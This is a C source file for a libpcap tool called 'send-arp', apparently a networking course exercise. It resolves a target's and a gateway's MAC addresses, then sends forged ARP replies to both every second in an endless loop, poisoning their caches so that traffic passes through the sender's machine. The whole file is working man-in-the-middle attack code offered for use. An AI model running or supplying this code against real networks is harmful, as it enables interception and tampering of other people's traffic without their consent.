#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pcap.h>
#include <unistd.h>

struct ethernet {
    uint8_t dst_mac[6];
    uint8_t src_mac[6];
    uint16_t ether_type;
}__attribute__((__packed__));

struct arp {
    uint16_t hardware;
    uint16_t protocol;
    uint8_t hardware_len;
    uint8_t protocol_len;
    uint16_t opcode;
    uint8_t src_mac[6];
    uint8_t src_ip[4];
    uint8_t dst_mac[6];
    uint8_t dst_ip[4];
}__attribute__((__packed__));

struct req_rep {
    struct ethernet eth_h;
    struct arp arp_h;
};

void usage() {
    printf("syntax : send-arp <Interface> <TARGET_IP> <GATEWAY_IP>\n");
    printf("sample : send-arp wlan0 192.168.0.10 192.168.0.1\n");
}

struct network{
    uint8_t target_mac[6];
    uint8_t gw_mac[6];
    uint8_t mac[6];
    uint8_t ip[4];
};

typedef struct {
    char* dev_;
    uint8_t target_ip_[4];
    uint8_t gw_ip_[4];
    struct network info;
} Param;

Param param = {
    .dev_ = NULL,
    .target_ip_ = {0, 0, 0, 0},
    .gw_ip_ = {0, 0, 0, 0}
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return false;
    }

    param->dev_ = argv[1];
    inet_pton(AF_INET, argv[2], param->target_ip_);
    inet_pton(AF_INET, argv[3], param->gw_ip_);
    return true;
}

void interface(char *dev) {
    struct ifaddrs *ifaddr, *ifa;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs error");
        exit(EXIT_FAILURE);
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr != NULL && ifa->ifa_addr->sa_family == AF_INET && strcmp(ifa->ifa_name, dev) == 0) {
            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
            memcpy(param.info.ip, &addr->sin_addr, 4);

            int fd;
            struct ifreq ifr;
            fd = socket(AF_INET, SOCK_DGRAM, 0);
            strncpy(ifr.ifr_name, ifa->ifa_name, IFNAMSIZ - 1);

            if (ioctl(fd, SIOCGIFHWADDR, &ifr) != -1) {
                for (int i = 0; i < 6; i++) {
                    param.info.mac[i] = (uint8_t) ifr.ifr_hwaddr.sa_data[i];
                }
                printf("\n");
            }
            close(fd);
        }
    }

    freeifaddrs(ifaddr);
}

void send_request(pcap_t *handle) {

    printf("===Request===\n");

    // send target IP
    struct ethernet eth1;
    memcpy(eth1.dst_mac, "\xff\xff\xff\xff\xff\xff", 6);
    memcpy(eth1.src_mac, param.info.mac, 6);
    eth1.ether_type = htons(ETHERTYPE_ARP);

    struct arp arp1;
    arp1.hardware = htons(ARPHRD_ETHER);
    arp1.protocol = htons(ETH_P_IP);
    arp1.hardware_len = 6;
    arp1.protocol_len = 4;
    arp1.opcode = htons(ARPOP_REQUEST);
    memcpy(arp1.src_mac, param.info.mac, 6);
    memcpy(arp1.src_ip, param.info.ip, 4);
    memset(arp1.dst_mac, 0, 6);
    memcpy(arp1.dst_ip, param.target_ip_, 4);

    // send gw IP
    struct ethernet eth2;
    memcpy(eth2.dst_mac, "\xff\xff\xff\xff\xff\xff", 6);
    memcpy(eth2.src_mac, param.info.mac, 6);
    eth2.ether_type = htons(ETHERTYPE_ARP);

    struct arp arp2;
    arp2.hardware = htons(ARPHRD_ETHER);
    arp2.protocol = htons(ETH_P_IP);
    arp2.hardware_len = 6;
    arp2.protocol_len = 4;
    arp2.opcode = htons(ARPOP_REQUEST);
    memcpy(arp2.src_mac, param.info.mac, 6);
    memcpy(arp2.src_ip, param.info.ip, 4);
    memset(arp2.dst_mac, 0, 6);
    memcpy(arp2.dst_ip, param.gw_ip_, 4);

    struct req_rep req1;
    req1.eth_h = eth1;
    req1.arp_h = arp1;

    if (pcap_sendpacket(handle, (const u_char *)&req1, sizeof(req1)) != 0) {
        printf("pcap_sendpacket request error(target IP)\n");
    }
    else {
        printf("Request packet sent(target IP)\n");
    }

    struct req_rep req2;
    req2.eth_h = eth2;
    req2.arp_h = arp2;

    if (pcap_sendpacket(handle, (const u_char *)&req2, sizeof(req2)) != 0) {
        printf("pcap_sendpacket request error(gateway IP)\n");
    }
    else {
        printf("Request packet sent(gateway IP)\n");
    }
    printf("\n");
}

void handle_packet(const uint8_t *packet, struct pcap_pkthdr *header) {
    printf("===Receiving packet===\n");
    struct ethernet *eth;
    struct arp *arp_packet;

    eth = (struct ethernet *)packet;
    if (ntohs(eth->ether_type) != ETHERTYPE_ARP) return;

    arp_packet = (struct arp *)(packet + sizeof(struct ethernet));
    if (ntohs(arp_packet->opcode) == ARPOP_REPLY) {
        if (memcmp(arp_packet->dst_ip, param.info.ip, 4) == 0) {
            printf("packet's Dst IP == My IP\n");
            if (memcmp(arp_packet->src_ip, param.target_ip_, 4) == 0) {
                for (int i = 0; i < 6; i++) {
                    param.info.target_mac[i] = arp_packet->src_mac[i];
                }
                printf("Stored target MAC\n");
            }
            if (memcmp(arp_packet->src_ip, param.gw_ip_, 4) == 0) {
                for (int i = 0; i < 6; i++) {
                    param.info.gw_mac[i] = arp_packet->src_mac[i];
                }
                printf("Stored gw MAC\n");
            }
        }
    }
}

void send_reply(pcap_t *handle) {
    struct req_rep rep;

    while (true) {

        // To target IP
        memcpy(rep.eth_h.dst_mac, param.info.target_mac, 6);
        memcpy(rep.eth_h.src_mac, param.info.mac, 6);
        rep.eth_h.ether_type = htons(ETHERTYPE_ARP);

        rep.arp_h.hardware = htons(ARPHRD_ETHER);
        rep.arp_h.protocol = htons(ETH_P_IP);
        rep.arp_h.hardware_len = 6;
        rep.arp_h.protocol_len = 4;
        rep.arp_h.opcode = htons(ARPOP_REPLY);
        memcpy(rep.arp_h.src_mac, param.info.mac, 6);
        memcpy(rep.arp_h.src_ip, param.gw_ip_, 4);
        memcpy(rep.arp_h.dst_mac, param.info.target_mac, 6);
        memcpy(rep.arp_h.dst_ip, param.target_ip_, 4);

        if (pcap_sendpacket(handle, (const u_char *)&rep, sizeof(rep)) !=0) {
            printf("pcap_sendpacket reply error(To target IP)\n");
        }
        else {
            printf("Reply packet sent(To target IP)\n");
        }

        // To gw IP
        memcpy(rep.eth_h.dst_mac, param.info.gw_mac, 6);
        memcpy(rep.eth_h.src_mac, param.info.mac, 6);
        rep.eth_h.ether_type = htons(ETHERTYPE_ARP);

        rep.arp_h.hardware = htons(ARPHRD_ETHER);
        rep.arp_h.protocol = htons(ETH_P_IP);
        rep.arp_h.hardware_len = 6;
        rep.arp_h.protocol_len = 4;
        rep.arp_h.opcode = htons(ARPOP_REPLY);
        memcpy(rep.arp_h.src_mac, param.info.mac, 6);
        memcpy(rep.arp_h.src_ip, param.target_ip_, 4);
        memcpy(rep.arp_h.dst_mac, param.info.gw_mac, 6);
        memcpy(rep.arp_h.dst_ip, param.gw_ip_, 4);

        if (pcap_sendpacket(handle, (const u_char *)&rep, sizeof(rep)) !=0) {
            printf("pcap_sendpacket reply error(To gateway IP)\n");
        }
        else {
            printf("Reply packet sent(To gateway IP)\n");
        }
        printf("\n");

        sleep(1);
    }
}

int main(int argc, char* argv[]) {
    char errbuf[PCAP_ERRBUF_SIZE];
    //pcap_t *handle;

    if (!parse(&param, argc, argv))
        return -1;

    if (!(param.dev_ = pcap_lookupdev(errbuf))) {
        printf("%s", errbuf);
        return -1;
    }

    interface(param.dev_);

    pcap_t* handle = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }

    // send request
    send_request(handle);

    // receive packet
    while (true) {
        struct pcap_pkthdr* header;
        const u_char *packet;
        int res = pcap_next_ex(handle, &header, &packet);

        if (res == 0) continue;
        handle_packet(packet, header);
        if (memcmp(param.info.target_mac, "\0\0\0\0\0\0", 6) != 0 && memcmp(param.info.gw_mac, "\0\0\0\0\0\0", 6) != 0) {
            printf("target Mac and gw MAC are stored\n");
            pcap_breakloop(handle);
            break;
        }
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("packet receive error : %s\n", pcap_geterr(handle));
            break;
        }
    }

    // send reply
    send_reply(handle);

    pcap_close(handle);

    return 0;
}


